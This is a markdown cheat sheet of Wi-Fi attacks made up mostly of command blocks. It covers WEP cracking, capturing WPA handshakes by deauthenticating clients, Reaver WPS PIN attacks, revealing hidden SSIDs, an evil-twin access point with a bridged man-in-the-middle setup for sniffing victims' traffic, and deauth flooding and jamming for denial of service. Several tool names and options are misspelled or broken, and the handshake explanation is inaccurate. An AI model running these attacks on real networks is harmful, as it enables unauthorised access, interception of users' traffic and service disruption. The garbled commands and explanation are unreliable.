# Wifi - Attack on Wireless Networks

## Introduction

**Handshake**

When we try to connect to a network, our computer goes to the access point (box) which will respond with a challenge. Our computer responds to the box with this encrypted challenge and the security key. The box receives confirmation that the device knows the key thanks to the encryption of the first challenge and therefore informs the device that for it communication is possible and encrypts the computer's challenge. The computer receives this message. It checks the encryption in turn. If both devices agree, then the communication is successfully established.


![handshake](./img/handshake.png)

## Tools

### Aircrack-ng

This is a suite of wireless network monitoring software whose main use is to break WEP and WPA keys in WIFI networks.
It is a rework of the discontinued aircrack software.

**Some features**:
```sh
aircrack-ng # static WEP and WPA-PSK key breaker
airdecap-ng # decrypt captured WEP/WPA files
aidriver-ng # allows you to patch drivers, which is useful for packet injection
airplay-ng # packet injection program
airmon-ng # enables/disables the monitor mode of a wifi card. In this mode the wifi card is placed as an observer of the network
airodump-ng # packet capture program 802.11
```

### Kismet

This is a free network detection software, sniffer and intrusion detection system for 802.11 wireless networks.

It works with cards that support monitor mode and any 802.11 protocol.

## Configuration

```sh
iwconfig # see its wifi configs
iwconfig [mapName] txpower 30 # increase its txpower by 30
airmon-ng start [mapName] # wifi card in monitor mode => indicate that you want to intercept all packets on the network
```

## Preparation of the equipment

Wifi card connected to the network
```sh
airmon-ng check kill # kill airmon related processes
airmon-ng start [interfaceName] # start monitor mode

airodump-ng [nomInterfaceMonitor] # scan for available wireless networks
```

```sh
# Ability to restart the service (instead of restarting the computer)
systemctl start wpa_supplicant.service && NetworkManager
```

## Bypassing HSSI (Hidden Service Set Identifier)

HSSI, consists in hiding the ESSID.

To obtain the ESSID, 2 possible methods:
* sniff the WI-FI environment and wait for a client associated with a network to connect and capture this association
* De-authenticate a client and force it to re-associate with the Access Point and capture the association


```sh
aireplay-ng -0 5 -a [HiddenMacNetworkAddress] [InterfaceMonitoringName]
# -0 to indicate that we will de-authenticate
# 5 to indicate that we are sending 5 packets
```

NB: remember to do the capture at the same time with airdump.


## Attacking WEP (Wireless Equivalent Privacy)

Quickly replaced by WPA (Wifi Protected Access)

### Initialization Vector (IV)

The RC4 base - stream Cipher Introduce a random element in the encrypted data.
VI-24 bit is too small to prevent repetition. Key can be recovered in 3 min (usually).


### Manual attack

Wifi card connected in monitoring mode!

```sh
airodump-ng [interfaceMonitor] # search for vulnerable wifi networks (BSSID recovery)
airodump-ng -c 11 -w [captureFilename] -b [BSSID] [interfaceMonitor] # check for passing Beacons
aireplay-ng -1 0 -a [BSSID] [interfaceMonitor] # send false authentication
aireplay-ng -3 -b [BSSID] [interfaceMonitor] # sending packets to send Beacons
aircrack-ng [captureFilename] # will attempt to crack the network (need as many IVs as possible)
```

### Automated attack

```sh
wifite # Power (the bigger is the number, the closer is the network) | To attack: CTRL+C (stop the analysis and start the interaction)
```
The password is also displayed in a crack.csv file

```sh
wifi cracker # GUI => everything is automated, just need to configure the bases. Different types of attacks are possible.
```


## Attacking WPA and WPA2 Wifi Protected Access


* WPA and WPA2 are Wi-Fi security protocols, succeeding WEP and solving the problems present on it
* They use a PSK (pre-shared key) to secure the communication. PSK must be random (13 char minimum)
* Most common attack => bruteforce
* If configured in enterprise mode using a RADIUS authentication server, WPA is almost impossible to crack


With the wifi card connected in monitoring mode!
```sh
airodump-ng [interfaceMonitor] # see the available networks you want to attack
airodump-ng -bssid [BSSID] --channel 1 --write [capturefile] [interfaceMonitor] # start listening for handshakes in an output file (capture)
aireplay-ng --deauth 1 -a [BSSID] [interfaceMonitor] --ignore-negative-one # start de-authentication packets

aircrack-ng [capturefile] -w /usr/share/wordlists/fern-wifi/common.txt
```


The `revear` attack is more concerned with testing PINs and may take longer.
```sh
airodump-ng [interfaceMonitor]
reaver -i [interfaceMonitor] -b [BSSID] -c [n°Channel] -vv
```

## Cloning access points

Manipulate the user's packets and retrieve the handshakes and keys by pretending to be the network the user is used to.

Wifi card connected and in monitoring mode.
```sh
airbase-ng -c [channelNumber] -e "AccessName" [interfaceMonitor] # create a fake access point

airbase-ng -c [channelNumber (less than default channel)] -a [BSSID] -e "ESSIDname" -L -W1 [interfaceMonitor] # copy an access point
# then wait for someone to connect
airodump-ng [interfaceMonitor] --bssid [BSSID] -w [capturefile] # create a capture file
airecrack-ng [capturefile] # crack the key (need as many IVs as possible)


# set up a MITM

airbase-ng --essid [netname=mitm] -c [channelNumber] [interfaceMonitor] # create an access point. This also creates an intermediate interface 'at0' for bridging.
brctl addbr mitm-bridge # bridgeControl tool to create bridges
brctl addif mitm-bridge eth0
brctl addif mitm-bridge at0
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
echo 1 > /proc/sys/net/ipv4/ip_forward # enable port forwarding

# Wait for someone to connect.
# Run wireshark to sniff traffic.
# We have access to all the user's requests whether they are on a phone or a computer.
```



## DOS attack

Dos attack by de-authenticating or directly causing denial of service.
Wireless networks are extremely susceptible to DOS. In addition, it is difficult to locate the attackers.

Create a DOS by flooding the network with authentication packets.

```sh
aireplay-ng -0 5 -a [BSSID] [interfaceMonitor] # tool to flood
# -0 to indicate that these are de-authentication packets
# 5 to say that we are sending 5. If you put 0, it's a continuous stream of packets

websploit
show modules # show available modules
use wifi/wifi_jammer
show options
set interface [interfaceMonitor] # check that the options are correctly set (interface, bssid, essid)
run # run the attack
```

